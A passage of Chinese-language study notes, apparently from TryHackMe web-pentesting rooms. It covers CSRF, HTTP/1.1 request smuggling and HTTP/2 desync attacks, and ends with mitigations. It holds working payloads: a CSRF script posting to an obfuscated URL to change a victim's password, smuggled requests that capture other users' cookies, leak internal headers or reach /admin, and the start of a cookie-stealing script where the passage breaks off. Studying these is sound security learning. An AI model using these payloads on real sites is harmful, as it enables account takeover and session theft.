}).</span><span style="color: #61AFEF">then</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75; font-style: italic">response</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=&gt;</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">ok</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">      </span><span style="color: #E5C07B">console</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">log</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;Password change request sent successfully. Status:&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">status</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">      </span><span style="color: #E5C07B">console</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">error</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;Password change request failed. Status:&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">status</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">  }).</span><span style="color: #61AFEF">catch</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75; font-style: italic">error</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=&gt;</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">console</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">error</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;An error occurred during the password change request:&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">error</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">  });</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&lt;script&gt;</span></span><span class="line"><span style="color: #abb2bf">  var targetUrlEncoded = &#39;aHR0cDovL3dvcmxkd2FwLnRo bT o4MDgxL2NoYW5nZV9wYXNzd29yZC5waHA=&#39;;</span></span><span class="line"><span style="color: #abb2bf">  var targetUrl = atob(targetUrlEncoded.replace(/\s/g, &#39;&#39;));</span></span><span class="line"><span style="color: #abb2bf">  var postBody = &#39;new_password=hacked123&#39;;</span></span><span class="line"><span style="color: #abb2bf">  var xhr = new XMLHttpRequest();</span></span><span class="line"><span style="color: #abb2bf">  xhr.open(&#39;POST&#39;, targetUrl, true);</span></span><span class="line"><span style="color: #abb2bf">  xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;);</span></span><span class="line"><span style="color: #abb2bf">  xhr.withCredentials = true;</span></span><span class="line"><span style="color: #abb2bf">  xhr.onload = function() {</span></span><span class="line"><span style="color: #abb2bf">    if (xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) {</span></span><span class="line"><span style="color: #abb2bf">      console.log(&#39;Password change request sent. Status:&#39;, xhr.status);</span></span><span class="line"><span style="color: #abb2bf">    } else {</span></span><span class="line"><span style="color: #abb2bf">      console.error(&#39;Password change request failed. Status:&#39;, xhr.status, xhr.statusText);</span></span><span class="line"><span style="color: #abb2bf">    }</span></span><span class="line"><span style="color: #abb2bf">  };</span></span><span class="line"><span style="color: #abb2bf">  xhr.onerror = function() {</span></span><span class="line"><span style="color: #abb2bf">    console.error(&#39;Network error during password change request.&#39;);</span></span><span class="line"><span style="color: #abb2bf">  };</span></span><span class="line"><span style="color: #abb2bf">  xhr.send(postBody);</span></span><span class="line"><span style="color: #abb2bf">&lt;/script&gt;</span></span></code></pre></div></div></figure><p>这一关还挺好玩的，要用到 CSRF，之前有印象但是没做笔记，用的是 XHR 来实现的，然后还对 url 做了 base64，避免 URL 被转成 a 标签。</p><h1 id="HTTP-Request-Smuggling"><a href="#HTTP-Request-Smuggling" class="headerlink" title="HTTP Request Smuggling"></a>HTTP Request Smuggling</h1><p>这个房间就是利用前端和后端服务器对一个请求的处理不一致导致的问题，里面主要用到的是一些 HTTP Header 的错配导致的问题，用到的主要有 Content-Length 和 Transfer-Encoding。还有一个就是计算 <code>\r</code> 和 <code>\n</code> 是否统计成字符数的问题。通过后面那个实操我感觉就像缓存投毒，会在一个连接里面复用，然后把其他用户的数据发到了不该发到的地方，这个直接应该是前端 - 后端这个过程中发生的。</p><h2 id="现代基架"><a href="#现代基架" class="headerlink" title="现代基架"></a>现代基架</h2><p>文中指出了现在的 Web 应用不是那么的直接了，大多都是由多个部分组成的，一般有以下几个部分：</p><ul><li>前端服务器</li><li>后端服务器</li><li>数据库</li><li>APIs</li><li>微服务：一般用 HTTP&#x2F;REST 或 gPRC</li><li>负载均衡</li><li>反代</li></ul><h3 id="缓存机制的职责"><a href="#缓存机制的职责" class="headerlink" title="缓存机制的职责"></a>缓存机制的职责</h3><p>缓存是一种技术，用于存储并重复利用之前获取的数据或计算结果，以加速后续的请求和计算。</p><p>在目前 Web 基础架构下，缓存有如下几点：</p><ul><li>内容缓存：一般缓存的是不会频繁刷新的内容，比如图片，CSS 和 JS。缓存机制能减少 Web 服务器的负载和加速用户的访问</li><li>数据库查询缓存：避免重复查</li><li>页面缓存：缓存整个网页，我猜这个是在 CDN 场景分发静态界面用到的</li><li>边缘缓存&#x2F;CDNs</li><li>API 缓存</li></ul><h2 id="HTTP-请求头"><a href="#HTTP-请求头" class="headerlink" title="HTTP 请求头"></a>HTTP 请求头</h2><p>每个 HTTP 头都有两个主要部分：header 和 body</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/Web_Application_Pentesting%5C802fad8f6515cfe16750e11e4b89957a.png" alt="HTTP Structure" data-caption="HTTP Structure" loading="lazy"></p><ol><li>Request Line：<strong>请求行</strong>是 HTTP 请求的第一行。它至少包含三个部分：<ol><li><strong>方法（Method）</strong>：一个单词的命令，告诉服务器如何处理请求的资源。例如，<code>GET</code> 或 <code>POST</code>。</li><li><strong>路径（Path）</strong>：URL 的路径部分，用于标识服务器上的具体资源（例如，<code>/admin/login</code>）。</li><li><strong>HTTP 版本号（HTTP Version Number）</strong>：表明客户端遵循的 HTTP 规范版本。</li><li>值得注意的是，HTTP&#x2F;2 和 HTTP&#x2F;1.1 在结构上有所不同。</li></ol></li><li>Request Header：这部分包含请求的元数据，比如发送内容的类型（<code>Content-Type</code>）、期望的响应格式，以及认证令牌（Authentication Tokens）等。</li><li>Message Body：这是请求的实际内容。对于 <code>GET</code> 请求，消息体通常是空的；但对于 <code>POST</code> 请求，它可能包含表单数据、JSON 数据包或上传的文件。</li></ol><p><strong>Content-Length Header</strong></p><p>Content-Length 标头表示请求或响应正文的大小（以字节为单位）。它告知接收服务器需要多少数据，以确保接收到全部内容。</p><p><strong>Transfer-Encoding Header</strong></p><p>Transfer-Encoding 标头用于指定应用于 HTTP 请求或响应的信息体的编码形式。该标头的常用值是 “chunked（分块）”，表示信息体被分成一系列块，每个块前面都有<strong>十六进制格式的大小</strong>。</p><figure class="shiki shell-session"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre><code>POST /submit HTTP/1.1Host: good.comContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunked    bq=smuggledData 0</code></pre></div></div></figure><p>这个例子中 <code>q=smuggledData</code> 大小是 11 字节，后面是新的一行。请求以一行 “0 ”结束，表示信息体的结束。每个分块的大小都以十六进制格式给出，分块正文的结束由大小为 0 的分块表示。</p><h3 id="HTTP-Request-Smuggling-Origin"><a href="#HTTP-Request-Smuggling-Origin" class="headerlink" title="HTTP Request Smuggling Origin"></a>HTTP Request Smuggling Origin</h3><p>如果 CL 和 TE 一起用的话，这种就容易引起问题，因为一些组件可能优先用 CL，也可能用 TE。这种缺陷就导致了一个组件觉得这个请求结束了，但是另一个组件认为他仍然存在，导致问题出现。</p><p>举例说明：假设前端服务器用 CL 来确定一个请求的结束然而后端服务器用的 TE。攻击者可以伪造一个请求，在前端服务器看来是一个边界，而在后端服务器看来是另一个边界。这可能导致一个请求被<strong>偷渡</strong>到另一个请求中，造成意想不到的行为和潜在漏洞。</p><h2 id="不同类型的偷渡"><a href="#不同类型的偷渡" class="headerlink" title="不同类型的偷渡"></a>不同类型的偷渡</h2><p>注意：这里指的前端服务器不单单指的是通俗意义上的<strong>网页前端</strong>服务器，而是广泛意义上的前端，比如说反代入口，负载均衡入口等等。</p><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL.TE"></a>CL.TE</h3><p>这种类型就是前端服务器用 CL 头，后端服务器用 TE。</p><figure class="shiki shell-session"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre><code>POST /search HTTP/1.1Host: example.comContent-Length: 130Transfer-Encoding: chunked0POST /update HTTP/1.1Host: example.comContent-Length: 13Content-Type: application/x-www-form-urlencodedisadmin=true</code></pre></div></div></figure><p>这个例子就是 CL 为 130 字节，前端服务器认为这个请求在 <code>isadmin=true</code> 后面结束，但是后端服务器看到了 TE 是 chunk，所以认为 0 是这个块的结尾，后面的是一个新的请求。可能会导致未授权访问的发生。</p><h3 id="不正确的-CL"><a href="#不正确的-CL" class="headerlink" title="不正确的 CL"></a>不正确的 CL</h3><p>如果 CL 少于实际的数据大小，他会按 CL 的数据来读取，这就会导致数据被截断了（也要看具体的应用服务器）。</p><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE.CL"></a>TE.CL</h3><p>和 CL.TE 不同，这种就完全反过来了，前端用的 TE，后端用的 CL。</p><figure class="shiki shell-session"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre><code>POST / HTTP/1.1Host: example.comContent-Length: 4Transfer-Encoding: chunked78POST /update HTTP/1.1Host: example.comContent-Type: application/x-www-form-urlencodedContent-Length: 15isadmin=true0</code></pre></div></div></figure><p>在上面的示例中，前端服务器看到了 <code>Transfer-Encoding: chunked</code> ，把这个请求当成块处理， <code>78</code> 标识接下来的 120 个字节是当前请求体的一部分，前端服务器会认为最后一个 <code>0</code> 之前的所有数据都是这个请求的一部分。</p><p>然而，后端服务器会使用 <code>Content-Length</code> 头，该头被设置为 <code>4</code>。它只会处理请求的前 4 个字节（78 \r \n）。请求的剩余部分（从 <code>POST /update</code> 开始）随后会被后端服务器解释为一个独立的新请求。</p><h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>TE.TE 漏洞不总是需要多个 <code>Transfer-Encoding</code> 头。相反，它通常涉及一个单独的、格式错误的 <code>Transfer-Encoding</code> 头，这个头被前端和后端服务器以不同的方式解释。</p><p>攻击者通过包含“chunked”的畸形变体来操纵 <code>Transfer-Encoding</code> 头。这样做是为了利用前端和后端服务器在优先级上如何处理 <code>Transfer-Encoding</code> (TE) 头而不是 <code>Content-Length</code> (CL) 头。通过构造畸形的 <code>Transfer-Encoding</code> 头，攻击者旨在使其中一台服务器忽略 TE 头而转而使用 CL 头，从而导致前端和后端服务器在解释请求边界时出现差异。这种操纵可能导致出现 CL.TE 或 TE.CL 情况，具体取决于哪台服务器退而使用 <code>Content-Length</code>。</p><figure class="shiki shell-session"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre><code>POST / HTTP/1.1Host: example.comContent-length: 4Transfer-Encoding: chunkedTransfer-Encoding: chunked14ePOST /update HTTP/1.1Host: example.comContent-length: 15isadmin=true0</code></pre></div></div></figure><p>前端服务器会遇到两个 <code>Transfer-Encoding</code> 头。第一个是标准的 <code>chunked</code> 编码，但第二个 <code>chunked1</code> 是非标准的。根据其配置，前端服务器可能会基于第一个 <code>Transfer-Encoding: chunked</code> 头来处理请求，并忽略畸形的 <code>chunked1</code>，从而将直到 <code>0</code>（表示分块消息结束）之前的所有内容都解释为单个分块消息的组成部分。</p><p>然而，后端服务器可能会以不同方式处理畸形的 <code>Transfer-Encoding: chunked1</code>。它可能要么拒绝畸形部分并像前端服务器一样处理请求，要么由于存在非标准头而以不同方式解释请求。如果它仅处理 <code>Content-length: 4</code> 所指示的前 4 个字节，那么从 <code>POST /update</code> 开始的请求剩余部分随后将被视为一个独立的、新的请求。</p><p>被走私的请求（包含 <code>isadmin=true</code> 参数）将由后端服务器处理，就好像它是一个合法且独立的请求一样。根据服务器功能和 <code>/update</code> 端点的性质，这可能导致未经授权的操作或数据修改。</p><hr><p>TBH 我不理解🤔为什么会出现未授权访问呢，后端不加鉴权的吗，为什么简单的绕过就能绕过这个鉴权？后面那个实操我倒能理解，他把别人的请求混在一起夹带到另一个会话了，导致我能偷他的数据。</p><h2 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h2><p>构造了一个 ATS (Apache Traffic Server) 作为前端代理, Nginx 作为 Web 服务器后端，PHP 处理动态内容。由于 ATS 和 Nginx 优先处理 Content-Length 和 Transfer-Encoding 标头的方式不同，存在 HTTP 请求走私的可能性。</p><figure class="shiki shell-session"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre><code>POST / HTTP/1.1Host: httprequestsmuggling.thmContent-Type: application/x-www-form-urlencodedContent-Length: 160Transfer-Encoding: chunked0POST /contact.php HTTP/1.1Host: httprequestsmuggling.thmContent-Type: application/x-www-form-urlencodedContent-Length: 500username=test&query=§</code></pre></div></div></figure><p>这个 payload，前端解析了 Content-Length，认为这是一整个请求，把他转发到后端，然而后端服务器优先解析 Transfer-Encoding，把 0 前面的请求截断，然后认为第二部分的 POST 请求是一个全新的请求。</p><p>然后疑似这个房间有 bug，过不去，搁置了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>HTTP 请求走私由于服务器对请求头的解析不一导致的。</p><h3 id="缓解方法"><a href="#缓解方法" class="headerlink" title="缓解方法"></a>缓解方法</h3><ul><li><strong>统一的头部处理：</strong> 确保所有服务器以相同的方式处理 HTTP 头部，以防止出现请求走私的机会。</li><li><strong>采用 HTTP&#x2F;2：</strong> 转向使用 HTTP&#x2F;2 可以增强对请求边界的管理，从而降低走私的风险。</li><li><strong>持续监控和审查：</strong> 密切关注服务器流量中是否存在请求走私的迹象，并定期进行检查以维护安全的服务器配置。</li><li><strong>团队意识：</strong> 确保开发和运维团队都了解请求走私的危险以及相应的预防措施。</li></ul><h1 id="HTTP-2-Request-Smuggling"><a href="#HTTP-2-Request-Smuggling" class="headerlink" title="HTTP&#x2F;2 Request Smuggling"></a>HTTP&#x2F;2 Request Smuggling</h1><h2 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP&#x2F;2"></a>HTTP&#x2F;2</h2><p>最大的区别是它更改了消息的格式，完全用二进制的格式，而不是 HTTP&#x2F;1.1 那种人类可读的格式。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b62f90be37525447e4a9118b906f1291.svg" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b62f90be37525447e4a9118b906f1291.svg" data-caption="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b62f90be37525447e4a9118b906f1291.svg" loading="lazy"></p><p>以下是 HTTP&#x2F;2 请求的几个主要组成部分：</p><ul><li><strong>伪头部（Pseudo-headers）</strong>：HTTP&#x2F;2 定义了一些以冒号 <code>:</code> 开头的特殊头部。这些是构成一个有效 HTTP&#x2F;2 请求的<strong>最小必需字段</strong>。例如，你可以在上图中看到 <code>:method</code>、<code>:path</code>、<code>:scheme</code> 和 <code>:authority</code> 等伪头部。</li><li><strong>常规头部（Headers）</strong>：在伪头部之后，是常规的 HTTP 头部，例如 <code>user-agent</code> 和 <code>content-length</code>。请注意，HTTP&#x2F;2 <strong>强制使用小写</strong>来表示这些头部名称。</li><li><strong>请求体（Request Body）</strong>：与 HTTP&#x2F;1.1 类似，请求体包含随请求发送的任何额外信息，例如 <code>POST</code> 请求的参数、上传的文件或其他数据。</li></ul><p>另一个重要的结构性改变，虽然可能不那么明显，但在于 HTTP&#x2F;2 <strong>为请求或响应的每个部分建立了精确的边界</strong>。HTTP&#x2F;2 不再像 HTTP&#x2F;1.1 那样依赖 <code>\r\n</code> 等特定字符来分隔不同的头部，或者依赖冒号 <code>:</code> 来分隔头部名称和值。相反，HTTP&#x2F;2 <strong>引入了明确的字段来跟踪请求（或响应）中每个部分的大小</strong>。</p><h3 id="Request-Smuggling-and-HTTP-2"><a href="#Request-Smuggling-and-HTTP-2" class="headerlink" title="Request Smuggling and HTTP&#x2F;2"></a>Request Smuggling and HTTP&#x2F;2</h3><p><strong>HTTP 请求走私之所以在 HTTP&#x2F;1 场景下成为可能，主要原因在于存在多种定义请求体大小的方式。</strong> 协议中的这种<strong>模糊性</strong>导致不同的代理服务器对请求何时结束以及下一个请求何时开始有各自的解释，最终引发了请求走私的情况。</p><p>在 HTTP 请求走私的语境下，我们最关注的一点是：HTTP&#x2F;2 <strong>明确定义了请求各部分的大小。</strong> 为了避免 HTTP&#x2F;1 中的这种不确定性，HTTP&#x2F;2 在每个请求组件前添加了一个包含其大小的字段。例如，每个头部都会被前置一个表示其大小的字段，这样解析器就能精确地知道需要读取多少信息。为了更好地理解这一点，我们来看看在 Wireshark 中捕获到的一个请求，特别是请求头部分：</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/Web_Application_Pentesting%5C25f541a57c89cb198f879c7fefee15ec.png" alt="HTTP 2 Binary Format" data-caption="HTTP 2 Binary Format" loading="lazy"></p><p>在图片中，我们看到的是 <code>:method</code> 伪头部。正如我们所观察到的，无论是<strong>头部名称</strong>还是<strong>头部值</strong>都带有各自的长度前缀。头部名称的长度是 7，对应着 <code>:method</code>；而头部值的长度是 3，对应着字符串 <code>GET</code>。</p><p>请求体同样包含一个长度指示器，这使得 <code>Content-Length</code> 和 <code>Transfer-Encoding: chunked</code> 等头部在纯粹的 HTTP&#x2F;2 环境中变得毫无意义。</p><p><strong>注意：</strong> 尽管 HTTP&#x2F;2 不会直接使用 <code>Content-Length</code> 头部，但现代浏览器在特定情况下（即可能发生 HTTP 降级时）仍会包含这些头部。</p><p>有了这样清晰的请求各部分边界，人们可能会认为请求走私是不可能的，在<strong>完全依赖 HTTP&#x2F;2 的实现中</strong>，某种程度上确实如此。然而，与任何新协议版本一样，并非所有设备都能直接升级。这导致了许多负载均衡器或反向代理虽然支持 HTTP&#x2F;2，但却从仍然使用 HTTP&#x2F;1 的服务器集群中提供内容。</p><p>我觉得最大的区别就是去掉了 <code>\r\n</code> ，然后加了类似 TLV 这样的格式，还在必须要有的字段加了一个伪头部。</p><h2 id="HTTP-2-Desync"><a href="#HTTP-2-Desync" class="headerlink" title="HTTP&#x2F;2 Desync"></a>HTTP&#x2F;2 Desync</h2><h3 id="HTTP-2-Downgrading"><a href="#HTTP-2-Downgrading" class="headerlink" title="HTTP&#x2F;2 Downgrading"></a>HTTP&#x2F;2 Downgrading</h3><p>当<strong>用户（或攻击者）与前端反向代理之间使用 HTTP&#x2F;2</strong>，而<strong>前端代理与后端服务器之间仍使用 HTTP&#x2F;1.1</strong> 时，我们称之为 <strong>HTTP&#x2F;2 降级（downgrading）</strong>。</p><p>在这种混合协议环境中，HTTP 请求走私是有可能发生的。攻击者并<strong>不是直接利用 HTTP&#x2F;2 的漏洞</strong>，而是通过精心构造的 HTTP&#x2F;2 请求，来<strong>影响前端代理将其转换为 HTTP&#x2F;1.1 请求的方式</strong>。</p><p>理想情况下，前端代理应该能完美地将一个 HTTP&#x2F;2 请求精确转换为一个等效的 HTTP&#x2F;1.1 请求。然而，在实际操作中，<strong>不同的代理实现方式会造成转换上的细微差异</strong>。攻击者正是利用这些差异，诱使代理在后端连接中生成畸形或意料之外的 HTTP&#x2F;1.1 请求，从而导致<strong>HTTP 脱同步（desync）</strong>。</p><h3 id="预期行为"><a href="#预期行为" class="headerlink" title="预期行为"></a>预期行为</h3><h4 id="H2-CL"><a href="#H2-CL" class="headerlink" title="H2.CL"></a>H2.CL</h4><p>HTTP&#x2F;2 不需要 <code>content-length</code> ，但是目前的现代浏览器会把他加上去预防 HTTP 降级。</p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8f01b7f9b691452f47a11b6363d5711b.svg" style="width:100%" alt="H2.CL Case" data-caption="H2.CL Case" loading="lazy"><p>如果前端带了一个大小为 0 的 content-length 过去，那么原始 Body 会拼接到新请求的后面。</p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/60cc684893cd19e782fb0178285e93fd.svg" style="width:100%" alt="H2.CL Victim" data-caption="H2.CL Victim" loading="lazy"><h4 id="H2-TE"><a href="#H2-TE" class="headerlink" title="H2.TE"></a>H2.TE</h4><p>我们同样能加 <code>Transfer-Encoding: chunked</code> 头部到前端 HTTP&#x2F;2 请求，代理也可能将其原封不动地传递给后端 HTTP&#x2F;1.1 连接。如果后端服务器优先选择这个头部去定义请求体的大小，我们能再次使这个连接去同步。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/62d1c36e7c84315008fdfb09519c218f.svg" alt="H2.TE Case" data-caption="H2.TE Case" loading="lazy"></p><p>可以看到一个请求里面又包含了一个新的请求，后端会解析那个 <code>0</code> ，把后面的一块当成新的请求来处理。</p><h4 id="CRLF-injection"><a href="#CRLF-injection" class="headerlink" title="CRLF injection"></a>CRLF injection</h4><p>这个就和 HTTP&#x2F;1.1 有关系了，因为 HTTP&#x2F;1.1 就是用 <code>\r\n</code> 来分隔字段的，一个空行里面插一个 <code>\r\n</code> 然后下一行跟着一个 GET 请求，就是新的一条请求了。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>有两种利用方式，一种是请求隧道，一种是去同步。</p><h3 id="H2-CL-1"><a href="#H2-CL-1" class="headerlink" title="H2.CL"></a>H2.CL</h3><p>通过修改 CL 为 0 ，同时修改 body 为特定字段，导致下一个请求的人的请求被拼接，造成 CSRF。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GET /post/like/12315198742342 HTTP/1.1</span></span><span class="line"><span style="color: #abb2bf">X: f</span></span></code></pre></div></div></figure><p>为什么能造成这样，是因为前端代理服务器把这个拆成 2 条请求了，上面这个 payload 会等待受害者的请求，一旦受害者请求，他的请求会被拼接在这后面，变成</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GET /post/like/xxx HTTP/1.1\r\n</span></span><span class="line"><span style="color: #abb2bf">X: fGET / HTTP/1.1\r\n</span></span><span class="line"><span style="color: #abb2bf">Host: xxxx\r\n</span></span><span class="line"><span style="color: #abb2bf">User-Agent: xxx\r\n</span></span><span class="line"><span style="color: #abb2bf">Cookie: COOKIE_STRING\r\n</span></span><span class="line"><span style="color: #abb2bf">\r\n</span></span></code></pre></div></div></figure><p>这样受害者就会携带他的 Cookie 去访问我们定义好的那个端点。</p><p>记得要在 Burp 里面取消<strong>更新 Content-Length</strong>，还有那个 payload 末尾不要有 \r\n，执行一次要等待 30s 去等待受害者去访问页面。</p><p>还有这个我实测是需要前一个请求是 POST 请求，如果是 GET 不生效。</p><h3 id="Leaking-Internal-Headers"><a href="#Leaking-Internal-Headers" class="headerlink" title="Leaking Internal Headers"></a>Leaking Internal Headers</h3><p>通过构造好的 payload 让别人的请求拼接在你的请求的参数里面，导致回显，这个例子是前端代理的 header 字段，比如这个 header 里面有一些密钥或者鉴权之类的 token，可以通过这种方式偷出来。</p><p>这个例子是利用前端的一个搜索参数，填在搜索区域的参数有回显导致的，和反射型 XSS 类似。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">abcd</span></span><span class="line"><span style="color: #abb2bf">Host: 10.10.161.96:8100</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">POST /hello HTTP/1.1</span></span><span class="line"><span style="color: #abb2bf">Content-Length: 300</span></span><span class="line"><span style="color: #abb2bf">Host: 10.10.161.96:8100</span></span><span class="line"><span style="color: #abb2bf">Content-Type: application/x-www-form-urlencoded</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">q=</span></span></code></pre></div></div></figure><p>这里同样记得把更新 Content-Length 关掉</p><h3 id="Bypassing-Frontend-Restrictions"><a href="#Bypassing-Frontend-Restrictions" class="headerlink" title="Bypassing Frontend Restrictions"></a>Bypassing Frontend Restrictions</h3><p>这个其实是一条请求里面混两条请求，用 POST 请求的目的是为了避免缓存</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">abcd</span></span><span class="line"><span style="color: #abb2bf">Host: 10.10.161.96:8100</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">GET /admin HTTP/1.1</span></span><span class="line"><span style="color: #abb2bf">X-Fake: a</span></span></code></pre></div></div></figure><p>这个方法也同样可以去绕 WAF，因为这个请求看起来我们是在访问一个合法的端点</p><h3 id="Web-Cache-Poisoning-缓存投毒"><a href="#Web-Cache-Poisoning-缓存投毒" class="headerlink" title="Web Cache Poisoning 缓存投毒"></a>Web Cache Poisoning 缓存投毒</h3><p>这个就不用过多解释了，投毒后 CSRF。</p><p><strong>偷 cookie payload</strong></p><p>要找一个文件上传点传上去，这里内置好了</p><figure class="shiki javascript"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">var</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">xhttp</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">XMLHttpRequest</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E5C07B">xhttp</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">onreadystatechange</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF">() {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">readyState</span><span 